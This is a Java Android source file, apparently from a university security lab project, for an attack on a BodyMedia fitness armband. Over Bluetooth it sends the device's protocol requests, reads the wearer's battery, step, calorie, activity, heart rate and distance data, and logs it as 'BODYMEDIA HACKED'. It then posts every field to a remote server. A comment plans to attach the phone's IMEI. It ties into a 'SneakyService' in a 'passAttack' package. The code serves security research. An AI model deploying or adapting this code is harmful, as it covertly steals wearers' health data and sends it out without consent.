package edu.illinois.seclab.extDroid.bm;

import java.io.DataInput;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.List;

import android.bluetooth.BluetoothSocket;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.util.Log;
import android.widget.Toast;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

import edu.illinois.seclab.extDroid.Http.Hermes;
import edu.illinois.seclab.extDroid.Preferences.Prefs;
import edu.illinois.seclab.extDroid.passAttack.SneakyService;

public class BodyHackThread extends Thread {
	private static final String TAG = "ConnectedThread";
	public static boolean READDATA = false;
    private final BluetoothSocket mmSocket;
    private final DataInputStream mmInStream;
    private final DataOutputStream mmOutStream;
    byte[] buffer = new byte[1024];  // buffer store for the stream
    Message envStatus = new Message();
    Bundle bundle = new Bundle();
 
    /**
     * 
     * @param socket
     * @author soteris demetriou
     */
    public BodyHackThread(BluetoothSocket socket) {
        mmSocket = socket;
        InputStream tmpIn = null;
        OutputStream tmpOut = null;
 
        // Get the input and output streams, using temp objects because
        // member streams are final
        try {
            tmpIn = socket.getInputStream();
            tmpOut = socket.getOutputStream();
        } catch (IOException e) { }
 
        mmInStream = new DataInputStream(tmpIn);
        mmOutStream = new DataOutputStream (tmpOut);
        BodyHackThread.READDATA = false;
    }
 
    public void run() {
        
        int bytes; // bytes returned from read()
        
      //Set a listening thread
      //ListeningThread listen = new ListeningThread(mmInStream);
      //listen.start();
 
        try {
        	Log.i(TAG, "Thread started");
        	
//        	
//        	Log.i(TAG, "---------AnnounceRequest---------");
//        	announceRequest();
//			deserialize(mmInStream);
//			sleep(500);
//			
//			Log.i(TAG, "---------Set Connectability Timeout Request---------");
//			setConnectabilityTORequest();
//			deserialize(mmInStream);
//			sleep(500);

			Log.i(TAG, "---------Extended Update Request---------");
			extendedUpdateRequest();
			deserialize(mmInStream);
			
		} catch (IOException e) {
			// TODO Auto-generated catch block
			//Log.i(TAG, "Exception reading");
			e.printStackTrace();}
//		} catch (InterruptedException e) {
//			// TODO Auto-generated catch block
//			e.printStackTrace();
//		}
        Message msg = new Message();
		msg.what = SneakyService.GOT_BM_DATA;
		//bundle.putInt(EnvironmentCheck.GOTDATAlabel, EnvironmentCheck.GOTDATA);
		//envStatus.setData(bundle);
        SneakyService.sshandler.sendMessage(msg);
/*
        // Keep listening to the InputStream until an exception occurs
        while ((!BodyHackThread.READDATA) && ( (System.currentTimeMillis() - SneakyService.POST_ATTACK_START_TIME) < Prefs.POST_WINDOW) ) {
        	Log.i(TAG, "Start BM Connect: " + (System.currentTimeMillis() - SneakyService.POST_ATTACK_START_TIME));
            
        	try {
            	if(SneakyService.socket.isConnected()){
	            	sleep(10);
	            	Log.i(TAG, "---------Extended Update Request---------");
	    			extendedUpdateRequest();
	    			deserialize(mmInStream);
	            	
	            	//mmInStream.read(buffer); //test
	                
	                //Log.i(TAG, "Received data: " + buffer.toString());
	                
	                // Send the obtained bytes to the UI activity
	                
	                //MainActivity.handler.obtainMessage(MainActivity.MESSAGE_READ, bytes, -1, buffer)
	                        //.sendToTarget();
            	}
            } catch (IOException e) {
                e.printStackTrace();
                //envStatus.what = SneakyService.GOT_BM_DATA;
	    		//bundle.putInt(EnvironmentCheck.EnvREADYlabel, EnvironmentCheck.EnvREADY);
	    		//envStatus.setData(bundle);
                //SneakyService.sshandler.sendMessage(envStatus);
                //sendGotDataMsg();
            } catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				//sendGotDataMsg();
			}
			
        }
        */
        //sendGotDataMsg();
    }
    
    private void sendGotDataMsg() {
		// TODO Auto-generated method stub
    	Message msg = new Message();
		msg.what = SneakyService.GOT_BM_DATA;
		SneakyService.sshandler.sendMessage(msg);
	}

	private void extendedUpdateRequest() throws IOException {
		// TODO Auto-generated method stub
    	mmOutStream.writeByte(2);
		mmOutStream.writeByte(2); //length
		/*
		mmOutStream.writeShort(PacketType.PACKET_TYPE_EXTENDED_UPDATE_REQUEST); //0x1310 - 4880
		*/
		mmOutStream.writeByte(0x10);
		mmOutStream.writeByte(0x13);
		
		mmOutStream.writeByte(3);
	}

	private void setConnectabilityTORequest() throws IOException {
		// TODO Auto-generated method stub
    	mmOutStream.writeByte(2); //start byte
		mmOutStream.writeByte(4); //length
		/*
		mmOutStream.writeShort(PacketType.PACKET_TYPE_SET_CONNECTABILITY_TIMEOUT_REQUEST); //0x1100 - 4352
		mmOutStream.writeShort(1440); //0x05a0 Timeout in Minutes:1440
		*/
		mmOutStream.writeByte(0x00);
		mmOutStream.writeByte(0x11);
		
		mmOutStream.writeByte(0xa0);
		mmOutStream.writeByte(0x05);
		
		mmOutStream.writeByte(3);
	}

	private void announceRequest() throws IOException {
		// TODO Auto-generated method stub
    	mmOutStream.writeByte(2); //start byte
		mmOutStream.writeByte(4); //length
		/*
		mmOutStream.writeShort(PacketType.PACKET_TYPE_ANNOUNCE_REQUEST); //0x1000
		mmOutStream.writeShort(2829); //VENDOR ID: 2829 - 0x0b0d
		*/
		mmOutStream.writeByte(0x00);
		mmOutStream.writeByte(0x10);
		
		mmOutStream.writeByte(0x0d);
		mmOutStream.writeByte(0x0b);
		
		mmOutStream.writeByte(3); //end byte
		//mmInStream.readFully(buffer);
		//Log.i(TAG, "Received data: " + buffer.toString());
	}

	private void deserialize(DataInputStream paramDataInput) throws IOException{
    	int[] ptype = new int[2];
		
    	if(SneakyService.socket.isConnected()){
	    	int startByte = paramDataInput.readUnsignedByte(); //[0x02]
	    	Log.i(TAG, Integer.toHexString(startByte));
	    	int packetLength = paramDataInput.readUnsignedByte(); 
	    	Log.i(TAG, Integer.toHexString(packetLength));
	    	
	    	int packetType = Utils.readLittleShort(paramDataInput);
	    	Log.i(TAG, "" + packetType);
	    	
	    	switch(packetType){
	    		case PacketType.PACKET_TYPE_ACCOUNCE_RESPONSE: 
	    			deserializeBodyAnnReq(paramDataInput);
	    			break;
	    		case PacketType.PACKET_TYPE_ANNOUNCE_ERROR_RESPONSE:
	    			Log.i(TAG, "Error Announce Response");
	    			break;
	    		case PacketType.PACKET_TYPE_SET_CONNECTABILITY_TIMEOUT_RESPONSE:
	    			deserializeBodyConnTOReq(paramDataInput);
	    			break;
	    		case PacketType.PACKET_TYPE_EXTNEDED_UPDATE_RESPONSE:
	    			deserializeBodyExtUpdReq(paramDataInput);
	    			
	    			
	                //stop looping
	                BodyHackThread.READDATA = true;
	    			break;
	    		case PacketType.PACKET_TYPE_UPDATE_ERROR_RESPONSE:
	    			Log.e(TAG, "Wearer not detected?");
	    			
	//	    		envStatus.what = SneakyService.GOT_BM_DATA;
	//	    		
	//	    		envStatus.setData(bundle);
	//                SneakyService.sshandler.sendMessage(envStatus);
	    			break;
	    		default:
	    				Log.i(TAG, "Unknown Response!!");
	 
	    				int numB = paramDataInput.available();
	    		    	for(int i = 0; i < numB - 1; i++){
	    		    		int b = paramDataInput.readUnsignedByte();
	    		    		Log.i(TAG, Integer.toHexString(b));
	    		    	}
	    		    	
	//    		    	envStatus.what = SneakyService.GOT_BM_DATA;
	//    	    		//bundle.putInt(EnvironmentCheck.EnvREADYlabel, EnvironmentCheck.EnvREADY);
	//    	    		envStatus.setData(bundle);
	//                    SneakyService.sshandler.sendMessage(envStatus);
	    				break;
	    		
	    	}
	    	
	    	int endByte = paramDataInput.readUnsignedByte();
	    	Log.i(TAG, Integer.toHexString(endByte));
	    	/*
	    	int numB = paramDataInput.available();
	    	for(int i = 0; i < numB; i++){
	    		int b = paramDataInput.readUnsignedByte();
	    		Log.i(TAG, Integer.toHexString(b));
	    	}
	    	*/
    	}
    }
    
    private void deserializeBodyAnnReq(DataInputStream paramDataInput) throws IOException {
		// TODO Auto-generated method stub
    	int productCode = paramDataInput.readShort();
        int firmwareVersionMajor = paramDataInput.readUnsignedByte();
        int firmwareVersionMinor = paramDataInput.readUnsignedByte();
        int firmwareVersionService = paramDataInput.readUnsignedByte();
        int firmwareVersionReserved = paramDataInput.readUnsignedByte();
        int serialNumber = paramDataInput.readInt();
	}

	private void deserializeBodyConnTOReq(DataInputStream mmInStream2) {
		// TODO Auto-generated method stub
		
	}

	void deserializeBodyExtUpdReq(DataInputStream paramDataInput)
		    throws IOException
		  {
		    Log.i(TAG, "Received data");
		    
		    final int batteryLevel = paramDataInput.readUnsignedByte();
		    final int memoryLevel = paramDataInput.readUnsignedByte();
		    final int stepsToday = Utils.readLittleInt(paramDataInput);
		    final int stepsYesterday = Utils.readLittleInt(paramDataInput);
		    final int stepsCumulative = Utils.readLittleInt(paramDataInput);
		    final int caloriesToday = Utils.readLittleShort(paramDataInput);
		    final int caloriesYesterday = Utils.readLittleShort(paramDataInput);
		    final int caloriesCumulative = Utils.readLittleInt(paramDataInput);
		    final int metsToday = paramDataInput.readUnsignedByte();
		    final int metsYesterday = paramDataInput.readUnsignedByte();
		    final int metsCurrent = Utils.readLittleUnsignedShort(paramDataInput);
		    final int moderateActivityToday = Utils.readLittleUnsignedShort(paramDataInput);
		    final int moderateActivityYesterday = Utils.readLittleUnsignedShort(paramDataInput);
		    final int moderateActivityCumulative = Utils.readLittleInt(paramDataInput);
		    final int vigorousActivityToday = Utils.readLittleUnsignedShort(paramDataInput);
		    final int vigorousActivityYesterday = Utils.readLittleUnsignedShort(paramDataInput);
		    final int vigorousActivityCumulative = Utils.readLittleInt(paramDataInput);
		    final int heartbeats = Utils.readLittleInt(paramDataInput);
		    final int heartRate = Utils.readLittleUnsignedShort(paramDataInput);
		    final int walkingDistanceToday = Utils.readLittleInt(paramDataInput);
		    final int walkingDistanceYesterday = Utils.readLittleInt(paramDataInput);
		    final int walkingDistanceCumulative = Utils.readLittleInt(paramDataInput);
		    final int walkingSpeedCurrent = paramDataInput.readUnsignedByte();
		    
		    Log.i(TAG, "Saved data");
		    
		    Handler handler = new Handler(Looper.getMainLooper());
			handler.post(new Runnable() {
			    public void run() {
			    	/*
			        Toast toast = Toast.makeText(MyApp.getContext() , "BODYMEDIA HACKED: " + 
			    "\nBattery Level: " + batteryLevel + "\nMemory Level: " + memoryLevel + "\nSteps Today: " 
			        		+ stepsToday + "\nSteps Yesterday: " + stepsYesterday + "\nSteps CUmulative: " 
			    + stepsCumulative + "\nCalories Today: " + caloriesToday 
			    + "\nCalories Yesterday: " + caloriesYesterday
			    + "\nCalories Cum: " + caloriesCumulative
			    + "\nmetsToday: " + metsToday
			    + "\nmetsYesterday: " + metsYesterday
			    + "\nmetsCurrent: " + metsCurrent
			    + "\nmoderateActivityToday: " + moderateActivityToday
			    + "\nmoderateActivityYesterday: " + moderateActivityYesterday
			    + "\nmoderateActivityCumulative: " + moderateActivityCumulative
			    + "\nvigorousActivityToday: " + vigorousActivityToday
			    + "\nvigorousActivityYesterday: " + vigorousActivityYesterday
			    + "\nvigorousActivityCumulative: " + vigorousActivityCumulative
			    + "\nheartbeats: " + heartbeats
			    + "\nheartRate: " + heartRate
			    + "\nwalkingDistanceToday: " + walkingDistanceToday
			    + "\nwalkingDistanceYesterday: " + walkingDistanceYesterday
			    + "\nwalkingDistanceCumulative: " + walkingDistanceCumulative
			    + "\nwalkingSpeedCurrent: " + walkingSpeedCurrent
			    , Toast.LENGTH_LONG);
			        toast.show();
			        */
			        
			        Log.i(TAG, "BODYMEDIA HACKED: " + 
			    "\nBattery Level: " + batteryLevel + "\nMemory Level: " + memoryLevel + "\nSteps Today: " 
			        		+ stepsToday + "\nSteps Yesterday: " + stepsYesterday + "\nSteps CUmulative: " 
			    + stepsCumulative + "\nCalories Today: " + caloriesToday 
			    + "\nCalories Yesterday: " + caloriesYesterday
			    + "\nCalories Cum: " + caloriesCumulative
			    + "\nmetsToday: " + metsToday
			    + "\nmetsYesterday: " + metsYesterday
			    + "\nmetsCurrent: " + metsCurrent
			    + "\nmoderateActivityToday: " + moderateActivityToday
			    + "\nmoderateActivityYesterday: " + moderateActivityYesterday
			    + "\nmoderateActivityCumulative: " + moderateActivityCumulative
			    + "\nvigorousActivityToday: " + vigorousActivityToday
			    + "\nvigorousActivityYesterday: " + vigorousActivityYesterday
			    + "\nvigorousActivityCumulative: " + vigorousActivityCumulative
			    + "\nheartbeats: " + heartbeats
			    + "\nheartRate: " + heartRate
			    + "\nwalkingDistanceToday: " + walkingDistanceToday
			    + "\nwalkingDistanceYesterday: " + walkingDistanceYesterday
			    + "\nwalkingDistanceCumulative: " + walkingDistanceCumulative
			    + "\nwalkingSpeedCurrent: " + walkingSpeedCurrent);
			    }
			      
			 });
			
			//TODO: Get device imei and send it along with the data to a remote loc
		    Hermes hermes = new Hermes();
		    ArrayList<NameValuePair> data_list = new ArrayList<NameValuePair>();
		    
		    data_list.add(new BasicNameValuePair("id", Preferences.bmdata_request_id));
		    data_list.add(new BasicNameValuePair("batteryLevel", "" + batteryLevel));
		    data_list.add(new BasicNameValuePair("memoryLevel", "" + memoryLevel));
		    data_list.add(new BasicNameValuePair("stepsToday", "" + stepsToday));
		    data_list.add(new BasicNameValuePair("stepsYesterday", "" + stepsYesterday));
		    data_list.add(new BasicNameValuePair("stepsCumulative", "" + stepsCumulative));
		    data_list.add(new BasicNameValuePair("caloriesToday", "" + caloriesToday));
		    data_list.add(new BasicNameValuePair("caloriesYesterday", "" + caloriesYesterday));
		    data_list.add(new BasicNameValuePair("caloriesCumulative", "" + caloriesCumulative));
		    data_list.add(new BasicNameValuePair("metsToday", "" + metsToday));
		    data_list.add(new BasicNameValuePair("metsYesterday", "" + metsYesterday));
		    data_list.add(new BasicNameValuePair("metsCurrent", "" + metsCurrent));
		    data_list.add(new BasicNameValuePair("moderateActivityToday", "" + moderateActivityToday));
		    data_list.add(new BasicNameValuePair("moderateActivityYesterday", "" + moderateActivityYesterday));
		    data_list.add(new BasicNameValuePair("moderateActivityCumulative", "" + moderateActivityCumulative));
		    data_list.add(new BasicNameValuePair("vigorousActivityToday", "" + vigorousActivityToday));
		    data_list.add(new BasicNameValuePair("vigorousActivityYesterday", "" + vigorousActivityYesterday)); 
		    data_list.add(new BasicNameValuePair("vigorousActivityCumulative", "" + vigorousActivityCumulative));
		    data_list.add(new BasicNameValuePair("heartbeats", "" + heartbeats));
		    data_list.add(new BasicNameValuePair("heartRate", "" + heartRate));
		    data_list.add(new BasicNameValuePair("walkingDistanceToday", "" + walkingDistanceToday));
		    data_list.add(new BasicNameValuePair("walkingDistanceYesterday", "" + walkingDistanceYesterday));
		    data_list.add(new BasicNameValuePair("walkingDistanceCumulative", "" + walkingDistanceCumulative));
		    data_list.add(new BasicNameValuePair("walkingSpeedCurrent", "" + walkingSpeedCurrent));
		    
		    Log.i(TAG, "Sending data ...");
		    HttpResponse response = hermes.send_post(data_list, Preferences.server_url);
		    if (response != null){
		    	String result = EntityUtils.toString( response.getEntity());
		    	Log.i(TAG, "result: " + result);
		    }
		    
		  }
 
    private void serializeEnterSniffMode() throws IOException {
		// TODO Auto-generated method stub
    	mmOutStream.writeByte(2);
    	
    	mmOutStream.writeByte(2); //paramDataOutput.writeByte(paramPacket.getLength());

    	mmOutStream.writeShort(7168); // paramDataOutput.writeShort(paramPacket.getPacketType()); //4880

        //paramPacket.serialize(paramDataOutput); //no serialize for ExtUpReq

        mmOutStream.writeByte(3); //paramDataOutput.writeByte(3);
        
        Log.i(TAG, "Sent EnterSniffMode request!");
	}

    public void serializeGenRequest(int length, int lsB, int msB){
    	
    	try {
    		//marker
			mmOutStream.writeByte(2);
			
			mmOutStream.writeByte(length);
			
			//mmOutStream.writeShort(packet_type);
			mmOutStream.writeByte(lsB);
			mmOutStream.writeByte(msB);
			
			//marker
			mmOutStream.writeByte(3);
			
			Log.i(TAG, "Sent request!");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
    	
    	
    }
    
    public void readRaw(){
    		Runnable r = new Runnable() {
				
				@Override
				public void run() {
					// TODO Auto-generated method stub
					Log.i(TAG, "...");
					try {
						Log.i(TAG, "Waiting to read...");
						mmInStream.read(buffer);
						Log.i(TAG, "Received data: " + buffer.toString());
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
					
				}
			};		        
        
			r.run();
    }
    
    public void serializeRequest(int length, int packet_type, int offset, int alen){
    	
    	try {
    		//marker
			mmOutStream.writeByte(2);
			
			mmOutStream.writeByte(length);
			
			mmOutStream.writeShort(packet_type);
			
			serializeBody(offset, alen);
			
			//marker
			mmOutStream.writeByte(3);
			
			Log.i(TAG, "Sent request!");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
    	
    	
    }
    
    void serializeBody(int offset, int alen)

    	    throws IOException

    	 {

    		mmOutStream.writeInt(offset); //paramDataOutput.writeInt(getIntegerValue("offset"));

    	    mmOutStream.writeByte(alen); //paramDataOutput.writeByte(getIntegerValue("length"));
    	 }
    
	private void serializeExtUpdReq() throws IOException {
		// TODO Auto-generated method stub
    	mmOutStream.writeByte(2);
    	
    	mmOutStream.writeByte(2); //paramDataOutput.writeByte(paramPacket.getLength());

    	mmOutStream.writeShort(4880); // paramDataOutput.writeShort(paramPacket.getPacketType()); //4880

        //paramPacket.serialize(paramDataOutput); //no serialize for ExtUpReq

        mmOutStream.writeByte(3); //paramDataOutput.writeByte(3);
        
        Log.i(TAG, "Sent ExtendedUpdateRequest request!");
	}

	/* Call this from the main activity to send data to the remote device */
    public void write(byte[] bytes) {
        try {
            mmOutStream.write(bytes);
        } catch (IOException e) { }
    }
 
    /* Call this from the main activity to shutdown the connection */
    public void cancel() {
        try {
        	mmSocket.close();
        } catch (IOException e) { }
    }
}
